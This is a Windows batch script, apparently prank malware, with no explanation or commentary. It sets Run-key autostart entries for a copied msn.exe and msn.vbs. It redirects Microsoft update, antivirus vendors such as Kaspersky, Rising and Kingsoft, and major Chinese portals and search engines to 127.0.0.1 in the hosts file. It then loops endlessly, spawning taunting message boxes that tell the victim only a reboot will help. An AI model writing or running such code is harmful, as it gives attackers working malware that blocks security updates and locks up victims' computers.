@echo off
@echo Windows Registry Editor Version 5.00>>c:\text.reg

@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>c:\text.reg
@echo "MM"="C:\\windows\\msn.exe">>c:\text.reg
@echo "vbs"="C:\\windows\\msn.vbs">>c:\text.reg
reg import C:\text.reg
del c:\text.reg
copy msn.exe C:\windows
@echo 127.0.0.1       microsoft.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       update.microsoft.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       3721.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       3721.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       cnsmin.3721.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       cnsmin.3721.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       download.3721.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       download.3721.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       www.3721.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       www.3721.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       sina.com.cn>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       sohu.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       cctv.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       cctv.com.cn>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       rising.com.cn>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       it.rising.com.cn>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       kingsoft.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       qq.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       jiangmin.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       update.jiangmin.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       update.kingsoft.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       kaspersky.com.cn>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       kaspersky.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       baidu.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       google.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       2dai.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       52happy.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       163.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       163.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       126.com>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       126.net>>%SystemRoot%\system32\drivers\etc\hosts
@echo 127.0.0.1       tencent.com>>%SystemRoot%\system32\drivers\etc\hosts
:1
@echo Msgbox "小样，你死定了!",vbInformation,"Hello">>c:\windows\msn.vbs
@echo Msgbox "这是一个死循环!祝你好运^_^",vbInformation,"注意">>c:\windows\msn.vbs
@echo Msgbox "你是不是很后悔?哈哈!没办法啦!除非你重启!",vbInformation,"死定了">>c:\windows\msn.vbs
@echo Msgbox "祈祷吧!可怜的人啊!",vbInformation,"永别了">>c:\windows\msn.vbs
@echo Msgbox "小样，你死定了!",vbInformation,"Hello">>c:\windows\msn.vbs
@echo Msgbox "这是一个死循环!祝你好运^_^",vbInformation,"注意">>c:\windows\msn.vbs
@echo Msgbox "你是不是很后悔?哈哈!没办法啦!除非你重启!",vbInformation,"死定了">>c:\windows\msn.vbs
@echo Msgbox "祈祷吧!可怜的人啊!",vbInformation,"永别了">>c:\windows\msn.vbs
@echo Msgbox "小样，你死定了!",vbInformation,"Hello">>c:\windows\msn.vbs
@echo Msgbox "这是一个死循环!祝你好运^_^",vbInformation,"注意">>c:\windows\msn.vbs
@echo Msgbox "你是不是很后悔?哈哈!没办法啦!除非你重启!",vbInformation,"死定了">>c:\windows\msn.vbs
@echo Msgbox "祈祷吧!可怜的人啊!",vbInformation,"永别了">>c:\windows\msn.vbs
@echo Msgbox "小样，你死定了!",vbInformation,"Hello">>c:\windows\msn.vbs
@echo Msgbox "这是一个死循环!祝你好运^_^",vbInformation,"注意">>c:\windows\msn.vbs
@echo Msgbox "你是不是很后悔?哈哈!没办法啦!除非你重启!",vbInformation,"死定了">>c:\windows\msn.vbs
@echo Msgbox "祈祷吧!可怜的人啊!",vbInformation,"永别了">>c:\windows\msn.vbs
@echo Msgbox "小样，你死定了!",vbInformation,"Hello">>c:\windows\msn.vbs
@echo Msgbox "这是一个死循环!祝你好运^_^",vbInformation,"注意">>c:\windows\msn.vbs
@echo Msgbox "你是不是很后悔?哈哈!没办法啦!除非你重启!",vbInformation,"死定了">>c:\windows\msn.vbs
@echo Msgbox "祈祷吧!可怜的人啊!",vbInformation,"永别了">>c:\windows\msn.vbs
@echo Msgbox "小样，你死定了!",vbInformation,"Hello">>c:\windows\msn.vbs
@echo Msgbox "这是一个死循环!祝你好运^_^",vbInformation,"注意">>c:\windows\msn.vbs
@echo Msgbox "你是不是很后悔?哈哈!没办法啦!除非你重启!",vbInformation,"死定了">>c:\windows\msn.vbs
@echo Msgbox "祈祷吧!可怜的人啊!",vbInformation,"永别了">>c:\windows\msn.vbs
@echo Msgbox "小样，你死定了!",vbInformation,"Hello">>c:\windows\msn.vbs
@echo Msgbox "这是一个死循环!祝你好运^_^",vbInformation,"注意">>c:\windows\msn.vbs
@echo Msgbox "你是不是很后悔?哈哈!没办法啦!除非你重启!",vbInformation,"死定了">>c:\windows\msn.vbs
@echo Msgbox "祈祷吧!可怜的人啊!",vbInformation,"永别了">>c:\windows\msn.vbs
c:\windows\msn.vbs
goto 1



